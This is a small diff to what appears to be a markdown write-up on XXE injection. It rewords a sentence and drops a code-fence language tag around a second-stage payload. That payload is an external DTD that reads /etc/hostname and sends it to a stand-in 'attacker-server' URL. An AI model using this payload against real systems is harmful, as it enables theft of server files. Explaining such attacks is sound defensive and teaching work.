@@ -105,9 +105,9 @@ At this point, the vulnerable server makes an outbound HTTP request to the attac
 
 #### 2nd. payload
 
-The external DTD file <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual exfiltration code:
+The external DTD file <b>poc.dtd</b>, hosted on the attacker's server that contains the actual exfiltration code:
 
-```xml
+```
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
 ```
